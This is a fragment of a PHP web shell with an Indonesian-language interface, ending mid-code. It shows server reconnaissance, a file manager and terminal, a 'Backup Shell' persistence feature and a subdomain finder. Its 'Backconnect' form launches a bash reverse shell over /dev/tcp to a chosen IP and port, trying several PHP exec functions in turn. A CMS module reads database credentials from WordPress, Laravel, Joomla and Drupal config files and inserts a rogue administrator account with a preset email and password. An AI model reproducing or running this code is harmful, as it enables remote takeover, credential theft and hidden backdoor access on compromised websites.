    // Fungsi ambil semua path open_basedir yang valid

    // Jika user klik tombol [Pindah], proses di sini

    // Tampilkan daftar tombol (selalu muncul)

    // Jika input IP → reverse lookup

    // Jika domain → resolve DNS

    // if IP => try reverse PTR

    // normalize domain

    // 1) Try crt.sh (JSON)

    // try curl

    // fallback file_get_contents
    // try decode JSON first
    // try regex extraction from text

    // 2) If no results from crt.sh, fallback to local DNS brute-force (common names)
    // prefer dns_get_record (more reliable)
    // last resort try gethostbyname (may return domain itself)

    // final output

    // nothing found
    // show debug info to help troubleshooting
    // ====== CMS DETECTION + ADD ADMIN (multi-cms best-effort) ======
    // Place this block where you want the detection + form + handler to appear.

    // Detect CMS (simple file-based)

    // ---- Render detection card ----
    // ---- Handler: proses tambah admin saat form submit ----

    // ----- WORDPRESS: use wp-load if available (recommended) -----
    // Try to include WordPress bootstrap and use WP API
    /** avoid variable pollution **/

    // ----- LARAVEL: try .env -> DB insert into users (best-effort) -----
    // parse common DB env vars
    // try insert into users table (common columns: name,email,password)
    // show fallback: try other common table name 'users' with different columns? we keep simple.

    // ----- JOOMLA: best-effort DB insert (may need adjustment per prefix/version) -----
    // crude extract of public $user, $password, $db, $host and $dbprefix
    // Joomla password hashing varies — try PHP password_hash (newer versions) or MD5 fallback.

    // users table and mapping (group id 8 = Super Users typical)
    // map to Super Users (group_id=8) — might differ by installation

    // ----- DRUPAL: best-effort DB insert (varies a lot across versions) -----
    // Try to parse $databases array crudely for default values (best-effort)
    // Drupal salts & hashing differ. Try to insert into users_field_data/users using password_hash (may not work).

    // drupal 8+ typical tables: users_field_data + users

    // ----- CUSTOM: try to append to includes/config.php or create local admin file -----
    // As fallback, create a local admin file in a safe name listing credentials (you can integrate into app) // end result box
    // Jika tombol HOME diklik, langsung pindah ke Document Root
    // ==== TAMPILKAN OPEN_BASEDIR & TOMBOL PINDAH ====

    // Fungsi ambil semua path open_basedir yang valid
    // Jika user klik tombol [Pindah], proses di sini
    // Tampilkan daftar tombol (selalu muncul)
    // Jika input IP → reverse lookup
    // Jika domain → resolve DNS
    // if IP => try reverse PTR
    // normalize domain
    // 1) Try crt.sh (JSON)
    // try curl
    // fallback file_get_contents
    // try decode JSON first
    // try regex extraction from text
    // 2) If no results from crt.sh, fallback to local DNS brute-force (common names)
    // prefer dns_get_record (more reliable)
    // last resort try gethostbyname (may return domain itself)
    // final output
    // nothing found
    // show debug info to help troubleshooting
    // ====== CMS DETECTION + ADD ADMIN (multi-cms best-effort) ======
    // Place this block where you want the detection + form + handler to appear.

    // Detect CMS (simple file-based)
    // ---- Render detection card ----
    // ---- Handler: proses tambah admin saat form submit ----
    // ----- WORDPRESS: use wp-load if available (recommended) -----
    // Try to include WordPress bootstrap and use WP API
    /** avoid variable pollution **/
    // ----- LARAVEL: try .env -> DB insert into users (best-effort) -----
    // parse common DB env vars
    // try insert into users table (common columns: name,email,password)
    // show fallback: try other common table name 'users' with different columns? we keep simple.
    // ----- JOOMLA: best-effort DB insert (may need adjustment per prefix/version) -----
    // crude extract of public $user, $password, $db, $host and $dbprefix
    // Joomla password hashing varies — try PHP password_hash (newer versions) or MD5 fallback.
    // users table and mapping (group id 8 = Super Users typical)
    // map to Super Users (group_id=8) — might differ by installation
    // ----- DRUPAL: best-effort DB insert (varies a lot across versions) -----
    // Try to parse $databases array crudely for default values (best-effort)
    // Drupal salts & hashing differ. Try to insert into users_field_data/users using password_hash (may not work).
    // drupal 8+ typical tables: users_field_data + users
    // ----- CUSTOM: try to append to includes/config.php or create local admin file -----
    // As fallback, create a local admin file in a safe name listing credentials (you can integrate into app)
    // end result box
    else: ?>
  <div class="card">
    <div style="display:flex;justify-content:space-between;align-items:center">
      <div>Session: <span class="small"><?php echo h(
          $_SESSION["fm_token"]
      ); ?></span></div>
      <div><a class="small" href="?action=logout" style="color:#9fb1d6">Keluar</a></div>
    </div>

    <div style="margin-top:12px" class="row">
        <div id="breadcrumb" class="pathnav"></div>
    </div>

    <div style="margin-top:12px" class="row">
      <div style="flex:2">
        <div class="card">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <div><strong>Terminal (VSCode Custom Sendiri)</strong></div>
            <div class="small">Base: <?php echo h($BASE_DIR); ?></div>
          </div>
          <div id="terminal" class="terminal">Maklo heker: ls, cd &lt;path&gt;, cd .., pwd, cat &lt;file&gt;, info, detect_cms, backup &lt;path&gt;, backup_quick, clear</div>

          <div class="form-row" style="margin-top:8px">
            <input id="cmd" class="input" placeholder="Tipe perintah (eg: ls)" />
            <button class="btn" onclick="runCmd()">Jalankan</button>
          </div>

          <div class="card">
            <div><strong>Terminal (VSCode Asli)</strong></div>
                <div id="termOut" style="font-family:monospace;white-space:pre;overflow-y:auto;height:300px;background:#111;color:#0f0;padding:10px;border-radius:8px;"></div>
                <form id="termForm">
                    <input type="text" id="termCmd" placeholder="Ketik perintah..." style="width:100%;padding:5px;background:#000;color:#0f0;border:none;">
                </form>
          </div>

          <!-- features under terminal: upload, mkfile, mkdir, manual cd -->
          <div style="margin-top:10px" class="card">
            <div style="display:flex;gap:8px;align-items:center">
              <div style="flex:1">
                <label class="small">Manual folder (cd):</label>
                <input id="manualCd" class="input" placeholder="Pindah folder atau .." />
              </div>
              <div>
                <button class="btn" onclick="manualCd()">Berangkat</button>
              </div>
              <div>
                <button class="btn" onclick="goUp()">..</button>
              </div>
            </div>

            <div style="margin-top:8px;display:flex;gap:8px;align-items:center">
              <div style="flex:1">
                <label class="small">Upload file disini ya bro:</label>
                <input id="uploadFile" type="file" class="upload-input" />
              </div>
              <div style="display:flex;flex-direction:column;gap:6px">
                <button class="btn" onclick="doUpload()">Upload</button>
                <button class="btn" onclick="createFilePrompt()">Buat File</button>
                <button class="btn" onclick="createFolderPrompt()">Buat Folder</button>
              </div>
            </div>
          </div>

        </div>

        <div class="card" style="margin-top:12px">
          <strong>File Browser</strong>
          <div style="margin-top:8px">
            <input id="dirInput" class="input" placeholder="Pindah folder (misalnya: . atau folder/sub)" />
            <div style="margin-top:8px"><button class="btn" onclick="listDir()">Daftar</button></div>
          </div>
          <div style="margin-top:12px">
            <table class="table" id="fileTable">
              <thead><tr><th>Nama</th><th>Perizinan</th><th>Badut</th><th>Ukuran</th><th>Modifikasi</th><th>Aksi</th></tr></thead>
              <tbody></tbody>
            </table>
          </div>
        </div>

      </div>

      <div style="flex:1">
        <div class="card">
            <div class="card-header" style="font-weight:bold;display:flex;justify-content:space-between;align-items:center;">
            <span>Server Info</span>
            <form method="post" style="margin:0;">
                <button type="submit" name="go_home" style="background:#000;color:#0f0;border:1px solid #0f0;border-radius:6px;padding:4px 10px;cursor:pointer;font-family:monospace;">
                    🏠 HOME
                </button>
            </form>
        </div>

        <div class="card-body" style="background:#00000080;color:#0f0;font-family:monospace;border-radius:8px;">
            <?php
            if (isset($_POST["go_home"])) {
                chdir($_SERVER["DOCUMENT_ROOT"]);
                echo "<div style='color:#0f0;'>✅ Berhasil kembali ke HOME: " .
                    htmlspecialchars(getcwd()) .
                    "</div><hr>";
            }

            $info = [
                "Uname" => php_uname(),
                "User" => get_current_user(),
                "Group" => function_exists("getmygid") ? getmygid() : "N/A",
                "PHP" => phpversion(),
                "Server IP" =>
                    $_SERVER["SERVER_ADDR"] ?? gethostbyname(gethostname()),
                "Your IP" => $_SERVER["REMOTE_ADDR"] ?? "Unknown",
                "HDD" =>
                    "Total: " .
                    round(disk_total_space("/") / 1073741824, 2) .
                    " GB | Free: " .
                    round(disk_free_space("/") / 1073741824, 2) .
                    " GB",
                "Disable Functions" => ini_get("disable_functions") ?: "None",
                "CURL" => function_exists("curl_version") ? "ON" : "OFF",
                "SSH2" => function_exists("ssh2_connect") ? "ON" : "OFF",
                "MySQL" => function_exists("mysqli_connect") ? "ON" : "OFF",
                "MSSQL" => function_exists("mssql_connect") ? "ON" : "OFF",
                "PostgreSQL" => function_exists("pg_connect") ? "ON" : "OFF",
                "Oracle" => function_exists("oci_connect") ? "ON" : "OFF",
                "CGI" =>
                    php_sapi_name() === "cgi" || php_sapi_name() === "cgi-fcgi"
                        ? "ON"
                        : "OFF",
                "Open_basedir" => ini_get("open_basedir") ?: "None",
                "Document root" => $_SERVER["DOCUMENT_ROOT"] ?? getcwd(),
                "Server Software" => $_SERVER["SERVER_SOFTWARE"] ?? "Unknown",
                "PHP SAPI" => php_sapi_name(),
                "Memory limit" => ini_get("memory_limit"),
                "Upload max" =>
                    ini_get("upload_max_filesize") .
                    " / " .
                    ini_get("post_max_size"),
            ];

            foreach ($info as $k => $v) {
                echo "<div><b>$k:</b> $v</div>";
            }
            ?>
        </div>
    </div>

        <div class="card"  style="margin-top:12px">
          <strong>Backup Shell</strong>
          <div class="small" style="margin-top:8px">Mau backup shell? <code>klik/</code> aja kawanku tombol dibawah <code>outputnya json kok tinggal salin</code>.</div>
          <div style="margin-top:8px">
            <button class="btn" onclick="doQuickBackup()">Auto Backup Shell</button>
          </div>
          <div id="backupOut" style="margin-top:8px;color:#9fe6a6"></div>
        </div>

        <div class="card" style="margin-top:12px">
            <?php
            function get_open_basedirs()
            {
                $dirs = explode(PATH_SEPARATOR, ini_get("open_basedir"));
                $dirs = array_filter(array_map("trim", $dirs));
                $out = [];
                foreach ($dirs as $d) {
                    $r = realpath($d);
                    if ($r && is_dir($r)) {
                        $out[] = $r;
                    }
                }
                return $out;
            }

            echo "<div style='padding:10px'>";
            echo "<h3 style='margin-top:0;color:#0f0'>Open_basedir Paths</h3>";

            if (isset($_GET["goto_basedir"])) {
                $target = $_GET["goto_basedir"];
                $success = false;
                foreach (get_open_basedirs() as $d) {
                    if (realpath($d) === realpath($target)) {
                        chdir($d);
                        $_SESSION["cwd"] = $d;
                        echo "<pre style='color:#0f0;margin:0 0 8px 0'>✅ Berhasil berpindah ke basedir: {$d}</pre>";
                        $success = true;
                        break;
                    }
                }
                if (!$success) {
                    echo "<pre style='color:#f66;margin:0 0 8px 0'>❌ Gagal: {$target} tidak termasuk open_basedir</pre>";
                }
            }

            $dirs = get_open_basedirs();
            if (empty($dirs)) {
                echo "<div style='color:#ccc'>Tidak ada open_basedir aktif.</div>";
            } else {
                foreach ($dirs as $d) {
                    $url = htmlspecialchars(
                        $_SERVER["PHP_SELF"] . "?goto_basedir=" . urlencode($d)
                    );
                    echo "<div style='margin:6px 0'>
                        <a href='{$url}' style='background:#111;color:#0f0;padding:6px 12px;
                        border-radius:8px;text-decoration:none'>Pindah</a>
                        <span style='color:#ccc;margin-left:8px'>{$d}</span>
                    </div>";
                }
            }
            echo "</div>";
            ?>
        </div>

        <div class="card" style="margin-top:12px">
            <div class="card-header" style="font-weight:bold">Backconnect</div>
            <div class="card-body">
                <form method="post" action="">
                <div class="mb-3">
                    <label>IP Address Target</label>
                    <input style="background:transparent;border:1px solid #0f0;color:#0f0;font-family:monospace;" type="text" name="ip" class="form-control" placeholder="contoh: 127.0.0.1" required>
                </div>
                <div class="mb-3">
                    <label>Port</label>
                    <input style="background:transparent;border:1px solid #0f0;color:#0f0;font-family:monospace;" type="number" name="port" class="form-control" placeholder="contoh: 4444" required>
                </div>
                <button type="submit" name="backconnect" class="btn btn-primary w-100">Connect</button>
                </form>

                <?php if (isset($_POST["backconnect"])) {
                    $ip = $_POST["ip"];
                    $port = (int) $_POST["port"];
                    echo "<div style='margin-top:10px;padding:8px;background:#111;color:#0f0;border-radius:6px;font-family:monospace'>";
                    echo "🔗 Backconnect ke <b>$ip:$port</b> sedang diproses...<br>";

                    $methods = [
                        "proc_open",
                        "popen",
                        "shell_exec",
                        "exec",
                        "system",
                    ];
                    $connected = false;

                    foreach ($methods as $fn) {
                        if (function_exists($fn)) {
                            @call_user_func(
                                $fn,
                                "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' &"
                            );
                            echo "✔️ Menggunakan metode <b>$fn</b><br>";
                            $connected = true;
                            break;
                        }
                    }

                    if (!$connected) {
                        echo "❌ Tidak ada metode backconnect yang aktif di server.";
                    }
                    echo "</div>";
                } ?>
            </div>
        </div>

        <?php if (isset($_POST["viewdns"])) {
            $domain = trim($_POST["domain"] ?? "");
            echo "<div class='card' style='margin-top:12px'>";
            echo "<div class='card-header' style='font-weight:bold'>DNS Info</div>";
            echo "<div class='card-body' style='background:#00000080;color:#0f0;font-family:monospace;border-radius:8px;'>";

            if ($domain === "") {
                echo "❌ Domain tidak boleh kosong.";
            } else {
                echo "🔍 Memeriksa DNS untuk <b>$domain</b><br><br>";

                if (filter_var($domain, FILTER_VALIDATE_IP)) {
                    $host = @gethostbyaddr($domain);
                    if ($host && $host !== $domain) {
                        echo "🧭 Hostname dari IP: <b>$host</b><br>";
                    } else {
                        echo "⚠️ Tidak dapat menemukan hostname untuk IP ini.<br>";
                    }
                }

                $records = @dns_get_record($domain, DNS_ALL);
                if ($records) {
                    echo "<table style='width:100%;border-collapse:collapse'>";
                    echo "<tr style='color:#0ff'><th align='left'>Tipe</th><th align='left'>Nilai</th></tr>";
                    foreach ($records as $r) {
                        $type = htmlspecialchars($r["type"]);
                        $value = htmlspecialchars(
                            $r["target"] ?? ($r["ip"] ?? ($r["txt"] ?? "-"))
                        );
                        echo "<tr><td>$type</td><td>$value</td></tr>";
                    }
                    echo "</table>";
                } else {
                    echo "⚠️ Tidak ada data DNS yang dapat diambil (mungkin domain tidak valid atau dibatasi server).";
                }
            }

            echo "</div></div>";
        } ?>

        <div class="card" style="margin-top:12px">
            <div class="card-header" style="font-weight:bold">View DNS Info</div>
            <div class="card-body">
                <form method="post" action="">
                    <div class="mb-3">
                        <label>Masukkan Domain atau IP</label>
                        <input type="text" name="domain" class="form-control"
                            style="background:transparent;color:#0f0;border:1px solid #0f0"
                            placeholder="contoh: example.com" required>
                    </div>
                    <button type="submit" name="viewdns" class="btn btn-primary w-100">Lihat DNS Info</button>
                </form>
            </div>
        </div>

        <div class="card" style="margin-top:12px">
            <div class="card-header" style="font-weight:bold">Subdomain Finder</div>
            <div class="card-body">
                <form method="post">
                <input type="text" name="target" class="input" placeholder="domain atau ip — contoh: example.com atau 1.2.3.4" required>
                <div style="margin-top:8px"><button class="btn" name="find_subdomain" type="submit">Cari</button></div>
                </form>

                <?php if (isset($_POST["find_subdomain"])) {
                    $raw = trim($_POST["target"] ?? "");
                    if ($raw === "") {
                        echo "<div class='terminal' style='margin-top:10px;'>❌ Input kosong.</div>";
                        return;
                    }

                    echo "<div class='terminal' style='margin-top:10px;font-family:monospace;'>";
                    echo "🔍 Mencari untuk: <b>" . h($raw) . "</b><br><br>";

                    if (filter_var($raw, FILTER_VALIDATE_IP)) {
                        $ptr = @gethostbyaddr($raw);
                        if ($ptr && $ptr !== $raw) {
                            echo "✅ PTR reverse: <b>" . h($ptr) . "</b><br>";
                        } else {
                            echo "❌ PTR tidak ditemukan untuk IP ini.<br>";
                        }
                        echo "</div>";
                        return;
                    }

                    $domain = strtolower(
                        preg_replace("/[^a-z0-9\.\-]/i", "", $raw)
                    );
                    if ($domain === "") {
                        echo "❌ Domain tidak valid.</div>";
                        return;
                    }

                    $crt_url =
                        "https://crt.sh/?q=%25." .
                        urlencode($domain) .
                        "&output=json";
                    $resp = false;
                    $used = [];
                    $debug = [];

                    if (function_exists("curl_version")) {
                        $used[] = "curl";
                        $ch = curl_init($crt_url);
                        curl_setopt_array($ch, [
                            CURLOPT_RETURNTRANSFER => true,
                            CURLOPT_TIMEOUT => 8,
                            CURLOPT_USERAGENT => "Subfinder/1.0",
                        ]);
                        $r = @curl_exec($ch);
                        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        $cerr = curl_errno($ch) ? curl_error($ch) : "";
                        curl_close($ch);
                        $debug["curl_http"] = $http;
                        $debug["curl_err"] = $cerr ?: "none";
                        if ($r && strlen($r) > 10) {
                            $resp = $r;
                        }
                    }

                    if ($resp === false && ini_get("allow_url_fopen")) {
                        $used[] = "file_get_contents";
                        $ctx = stream_context_create([
                            "http" => [
                                "timeout" => 8,
                                "header" => "User-Agent: Subfinder/1.0\r\n",
                            ],
                        ]);
                        $r = @file_get_contents($crt_url, false, $ctx);
                        $debug["fopen_ok"] = $r ? "yes" : "no";
                        if ($r && strlen($r) > 10) {
                            $resp = $r;
                        }
                    }

                    $subs = [];

                    if ($resp !== false) {
                        $json = @json_decode($resp, true);
                        if (
                            json_last_error() === JSON_ERROR_NONE &&
                            is_array($json)
                        ) {
                            foreach ($json as $item) {
                                $nv = $item["name_value"] ?? "";
                                foreach (preg_split("/\s+/", $nv) as $n) {
                                    $n = strtolower(trim($n));
                                    $n = ltrim($n, "*.");
                                    if (
                                        $n !== "" &&
                                        substr($n, -strlen($domain)) === $domain
                                    ) {
                                        $subs[] = $n;
                                    }
                                }
                            }
                            $source = "crt.sh (json)";
                        } else {
                            if (
                                preg_match_all(
                                    "/[A-Za-z0-9\-\_\.]+" .
                                        preg_quote($domain, "/") .
                                        "/",
                                    $resp,
                                    $m
                                )
                            ) {
                                foreach ($m[0] as $n) {
                                    $n = ltrim(strtolower($n), "*.");
                                    $subs[] = $n;
                                }
                                $source = "crt.sh (regex)";
                            } else {
                                $source = "crt.sh (no parse)";
                            }
                        }
                    } else {
                        $debug["note"] = "crt.sh fetch gagal";
                        $source = "none";
                    }

                    $subs = array_values(array_unique($subs));
                    sort($subs, SORT_NATURAL | SORT_FLAG_CASE);

                    if (empty($subs)) {
                        $wordlist = [
                            "www",
                            "mail",
                            "ftp",
                            "cpanel",
                            "webmail",
                            "dev",
                            "staging",
                            "api",
                            "m",
                            "test",
                            "portal",
                            "admin",
                            "shop",
                            "blog",
                            "ns1",
                            "ns2",
                        ];
                        $found = [];
                        foreach ($wordlist as $w) {
                            $host = $w . "." . $domain;
                            $rec = @dns_get_record(
                                $host,
                                DNS_A + DNS_CNAME + DNS_AAAA
                            );
                            if (!empty($rec)) {
                                $found[] = $host;
                            } else {
                                $ip = @gethostbyname($host);
                                if ($ip && $ip !== $host) {
                                    $found[] = $host;
                                }
                            }
                        }
                        $found = array_values(array_unique($found));
                        sort($found, SORT_NATURAL | SORT_FLAG_CASE);
                        if (!empty($found)) {
                            echo "⚠️ crt.sh tidak memberikan data — fallback DNS brute-force berhasil (" .
                                count($found) .
                                "):<br>";
                            foreach ($found as $s) {
                                echo "- " . h($s) . "<br>";
                            }
                            echo "<br><small style='color:#9fb1d6'>Metode: local DNS probe (wordlist)</small>";
                            echo "</div>";
                            return;
                        }
                    }

                    if (!empty($subs)) {
                        echo "✅ Ditemukan <b>" .
                            count($subs) .
                            "</b> subdomain (sumber: " .
                            h($source) .
                            "):<br>";
                        foreach ($subs as $s) {
                            echo "- " . h($s) . "<br>";
                        }
                        echo "</div>";
                        return;
                    }

                    echo "❌ Tidak ada subdomain yang terdeteksi.<br>";
                    echo "<small style='color:#f66'>Sumber crt.sh tidak dapat diakses atau fetch gagal.</small><br>";
                    if (!empty($debug)) {
                        echo "<details style='margin-top:6px;color:#999'><summary>Debug info</summary><pre style='white-space:pre-wrap'>";
                        foreach ($debug as $k => $v) {
                            echo h($k) . " = " . h((string) $v) . "\n";
                        }
                        echo "</pre></details>";
                    } else {
                        echo "<small style='color:#999'>Tidak ada debug (curl & fopen mungkin tidak tersedia).</small>";
                    }
                    echo "</div>";
                } ?>
            </div>
        </div>

        <?php
        $base = __DIR__;
        $cms_type = "unknown";
        $cms_info = [];

        if (file_exists("$base/wp-config.php")) {
            $cms_type = "wordpress";
            $cms_info["name"] = "WordPress";
            $cms_info["config"] = realpath("$base/wp-config.php");
        } elseif (file_exists("$base/configuration.php")) {
            $cms_type = "joomla";
            $cms_info["name"] = "Joomla";
            $cms_info["config"] = realpath("$base/configuration.php");
        } elseif (file_exists("$base/sites/default/settings.php")) {
            $cms_type = "drupal";
            $cms_info["name"] = "Drupal";
            $cms_info["config"] = realpath("$base/sites/default/settings.php");
        } elseif (file_exists("$base/.env")) {
            $cms_type = "laravel";
            $cms_info["name"] = "Laravel / .env";
            $cms_info["config"] = realpath("$base/.env");
        } elseif (file_exists("$base/includes/config.php")) {
            $cms_type = "custom";
            $cms_info["name"] = "Custom (includes/config.php)";
            $cms_info["config"] = realpath("$base/includes/config.php");
        } else {
            $cms_info["name"] = "Tidak terdeteksi";
            $cms_info["config"] = "-";
        }

    // ---- Render detection card ----
    ?>
        <div class="card" style="margin-top:12px">
        <strong>Deteksi CMS (Taruh di folder utama, contoh: public_html )</strong>
        <div style="margin-top:8px;padding:8px;background:#111;color:#9fe6a6;border-radius:6px;font-family:monospace;">
            <pre style="white-space:pre-wrap;margin:0;">
        CMS: <?php echo htmlspecialchars($cms_info["name"]); ?>

        Config: <?php echo htmlspecialchars($cms_info["config"]); ?>
        Path: <?php echo htmlspecialchars(realpath($base)); ?>
            </pre>
        </div> 
        </div>

        <div class="card" style="margin-top:14px">
        <strong>Tambah Admin Baru</strong>
        <form method="post" style="margin-top:10px;">
            <label class="small">Username:</label>
            <input type="text" name="admin_user" class="input" placeholder="masukkan username" required>

            <label class="small" style="margin-top:8px;">Email:</label>
            <input type="email" name="admin_email" class="input" value="muhrazky@gmail.com" required>

            <label class="small" style="margin-top:8px;">Password:</label>
            <input type="text" name="admin_pass" class="input" value="kem" readonly>

            <button class="btn" type="submit" name="add_admin" style="margin-top:10px;">Tambah Admin</button>
        </form>
        </div>

        <?php if (isset($_POST["add_admin"])) {
            $admin_user = trim($_POST["admin_user"]);
            $admin_email = trim($_POST["admin_email"]);
            $admin_pass = $_POST["admin_pass"];

            echo "<div style='margin-top:14px;padding:8px;background:#000;color:#9fe6a6;border-radius:6px;font-family:monospace'>";
            echo "👤 Menambahkan admin baru...\n";
            echo "👥 Username: " . htmlspecialchars($admin_user) . "\n";
            echo "📧 Email: " . htmlspecialchars($admin_email) . "\n";
            echo "🔒 Password: " . htmlspecialchars($admin_pass) . "\n";
            echo "──────────────────────────\n";

            if ($cms_type === "wordpress") {
                $wp_load = "$base/wp-load.php";
                if (file_exists($wp_load)) {
                    try {
                        define("WP_INSTALLING", true);
                        require_once $wp_load;

                        if (function_exists("username_exists")) {
                            if (username_exists($admin_user)) {
                                echo "⚠️ Username already exists in WordPress.\n";
                            } else {
                                $user_id = wp_create_user(
                                    $admin_user,
                                    $admin_pass,
                                    $admin_email
                                );
                                if (is_wp_error($user_id)) {
                                    echo "❌ Gagal membuat user: " .
                                        $user_id->get_error_message() .
                                        "\n";
                                } else {
                                    $u = new WP_User($user_id);
                                    $u->set_role("administrator");
                                    echo "✅ WordPress: user dibuat dan di-set sebagai administrator (ID: $user_id).\n";
                                }
                            }
                        } else {
                            echo "⚠️ Fungsi WP tidak tersedia meski wp-load ditemukan.\n";
                        }
                    } catch (Throwable $e) {
                        echo "❌ Exception saat bootstrap WP: " .
                            $e->getMessage() .
                            "\n";
                    }
                } else {
                    echo "❌ wp-load.php tidak ditemukan — tidak bisa bootstrap WP.\n";
                }
            } elseif ($cms_type === "laravel") {
                $env = @file_get_contents("$base/.env");
                if ($env !== false) {
                    preg_match("/DB_CONNECTION=(.+)/", $env, $m_conn);
                    preg_match("/DB_HOST=(.+)/", $env, $m_host);
                    preg_match("/DB_PORT=(.+)/", $env, $m_port);
                    preg_match("/DB_DATABASE=(.+)/", $env, $m_db);
                    preg_match("/DB_USERNAME=(.+)/", $env, $m_user);
                    preg_match("/DB_PASSWORD=(.*)/", $env, $m_pass);

                    $dbHost = trim($m_host[1] ?? "127.0.0.1");
                    $dbPort = trim($m_port[1] ?? "3306");
                    $dbName = trim($m_db[1] ?? "");
                    $dbUser = trim($m_user[1] ?? "");
                    $dbPass = trim($m_pass[1] ?? "");

                    if ($dbName === "") {
                        echo "❌ Gagal: DB_DATABASE tidak ditemukan di .env\n";
                    } else {
                        $mysqli = @new mysqli(
                            $dbHost,
                            $dbUser,
                            $dbPass,
                            $dbName,
                            (int) $dbPort
                        );
                        if ($mysqli->connect_error) {
                            echo "❌ Koneksi DB gagal: " .
                                $mysqli->connect_error .
                                "\n";
                        } else {
                            $hash = password_hash($admin_pass, PASSWORD_BCRYPT);
                            $safeName = $mysqli->real_escape_string(
                                $admin_user
                            );
                            $safeEmail = $mysqli->real_escape_string(
                                $admin_email
                            );
                            $safePass = $mysqli->real_escape_string($hash);
                            $now = date("Y-m-d H:i:s");

                            $insert = "INSERT INTO `users` (`name`,`email`,`password`,`created_at`,`updated_at`) VALUES ('$safeName','$safeEmail','$safePass','$now','$now')";
                            if ($mysqli->query($insert)) {
                                $newId = $mysqli->insert_id;
                                echo "✅ Laravel-ish: record ditambahkan ke tabel `users` (ID: $newId). Cek role/permission sesuai app.\n";
                            } else {
                                echo "❌ Gagal insert ke users: " .
                                    $mysqli->error .
                                    "\n";
                            }
                            $mysqli->close();
                        }
                    }
                } else {
                    echo "❌ .env tidak dapat dibaca.\n";
                }
            } elseif ($cms_type === "joomla") {
                $conf = @file_get_contents("$base/configuration.php");
                if ($conf !== false) {
                    preg_match(
                        "/public \\$user\\s*=\\s*'([^']+)'/",
                        $conf,
                        $m_user
                    );
                    preg_match(
                        "/public \\$password\\s*=\\s*'([^']+)'/",
                        $conf,
                        $m_pass
                    );
                    preg_match(
                        "/public \\$db\\s*=\\s*'([^']+)'/",
                        $conf,
                        $m_db
                    );
                    preg_match(
                        "/public \\$host\\s*=\\s*'([^']+)'/",
                        $conf,
                        $m_host
                    );
                    preg_match(
                        "/public \\$dbprefix\\s*=\\s*'([^']+)'/",
                        $conf,
                        $m_prefix
                    );

                    $dbUser = $m_user[1] ?? "";
                    $dbPass = $m_pass[1] ?? "";
                    $dbName = $m_db[1] ?? "";
                    $dbHost = $m_host[1] ?? "127.0.0.1";
                    $prefix = $m_prefix[1] ?? "jos_";

                    if ($dbName === "") {
                        echo "❌ Gagal: kredensial DB Joomla tidak ditemukan di configuration.php\n";
                    } else {
                        $mysqli = @new mysqli(
                            $dbHost,
                            $dbUser,
                            $dbPass,
                            $dbName
                        );
                        if ($mysqli->connect_error) {
                            echo "❌ Koneksi DB gagal: " .
                                $mysqli->connect_error .
                                "\n";
                        } else {
                            $pw_hash = password_hash(
                                $admin_pass,
                                PASSWORD_BCRYPT
                            );
                            $safeUser = $mysqli->real_escape_string(
                                $admin_user
                            );
                            $safeEmail = $mysqli->real_escape_string(
                                $admin_email
                            );
                            $safePass = $mysqli->real_escape_string($pw_hash);
                            $now = date("Y-m-d H:i:s");

                            $u_tbl = $mysqli->real_escape_string(
                                $prefix . "users"
                            );
                            $map_tbl = $mysqli->real_escape_string(
                                $prefix . "user_usergroup_map"
                            );

                            $insertUser = "INSERT INTO `$u_tbl` (`name`,`username`,`email`,`password`,`registerDate`,`lastvisitDate`) 
                                        VALUES ('$safeUser','$safeUser','$safeEmail','$safePass','$now','$now')";
                            if ($mysqli->query($insertUser)) {
                                $uid = $mysqli->insert_id;
                                $gid = 8;
                                $insertMap = "INSERT INTO `$map_tbl` (`user_id`,`group_id`) VALUES ($uid,$gid)";
                                if ($mysqli->query($insertMap)) {
                                    echo "✅ Joomla-ish: user dibuat (ID: $uid). Cek kembali hashing & group mapping sesuai versi Joomla.\n";
                                } else {
                                    echo "⚠️ User dibuat (ID: $uid) tetapi gagal memasukkan mapping group: " .
                                        $mysqli->error .
                                        "\n";
                                }
                            } else {
                                echo "❌ Gagal membuat user Joomla: " .
                                    $mysqli->error .
                                    "\n";
                            }
                            $mysqli->close();
                        }
                    }
                } else {
                    echo "❌ Tidak dapat membaca configuration.php\n";
                }
            } elseif ($cms_type === "drupal") {
                $conf = @file_get_contents("$base/sites/default/settings.php");
                if ($conf !== false) {
                    preg_match("/'database'\\s*=>\\s*'([^']+)'/", $conf, $m_db);
                    preg_match(
                        "/'username'\\s*=>\\s*'([^']+)'/",
                        $conf,
                        $m_user
                    );
                    preg_match(
                        "/'password'\\s*=>\\s*'([^']+)'/",
                        $conf,
                        $m_pass
                    );
                    preg_match("/'host'\\s*=>\\s*'([^']+)'/", $conf, $m_host);

                    $dbName = $m_db[1] ?? "";
                    $dbUser = $m_user[1] ?? "";
                    $dbPass = $m_pass[1] ?? "";
                    $dbHost = $m_host[1] ?? "127.0.0.1";

                    if ($dbName === "") {
                        echo "❌ Gagal: kredensial DB Drupal tidak terdeteksi otomatis.\n";
                    } else {
                        $mysqli = @new mysqli(
                            $dbHost,
                            $dbUser,
                            $dbPass,
                            $dbName
                        );
                        if ($mysqli->connect_error) {
                            echo "❌ Koneksi DB gagal: " .
                                $mysqli->connect_error .
                                "\n";
                        } else {
                            $hash = password_hash($admin_pass, PASSWORD_BCRYPT);
                            $safeName = $mysqli->real_escape_string(
                                $admin_user
                            );
                            $safeEmail = $mysqli->real_escape_string(
                                $admin_email
                            );
                            $safePass = $mysqli->real_escape_string($hash);
                            $created = time();

                            $insUsers = "INSERT INTO `users` (`uid`,`name`,`pass`,`mail`,`status`,`created`) VALUES (NULL,'$safeName','$safePass','$safeEmail',1,$created)";
                            if ($mysqli->query($insUsers)) {
                                $uid = $mysqli->insert_id;
                                echo "✅ Drupal-ish: record users ditambahkan (ID: $uid). Perlu set role/permissions lewat DB atau admin UI.\n";
                            } else {
                                echo "❌ Gagal insert user Drupal: " .
                                    $mysqli->error .
                                    "\n";
                            }
                            $mysqli->close();
                        }
                    }
                } else {
                    echo "❌ Tidak dapat membaca sites/default/settings.php\n";
                }
            } elseif ($cms_type === "custom") {
                $note =
                    "User: $admin_user\nEmail: $admin_email\nPass: $admin_pass\nCreatedAt: " .
                    date("c") .
                    "\n";
                $fname = $base . "/.created_admin_" . time() . ".txt";
                if (@file_put_contents($fname, $note)) {
                    echo "✅ Custom: file kredensial dibuat di " .
                        realpath($fname) .
                        "\n";
                    echo "⚠️ Integrasikan sendiri ke sistem custom (variasi besar antar aplikasi).\n";
                } else {
                    echo "❌ Gagal menulis file kredensial di server.\n";
                }
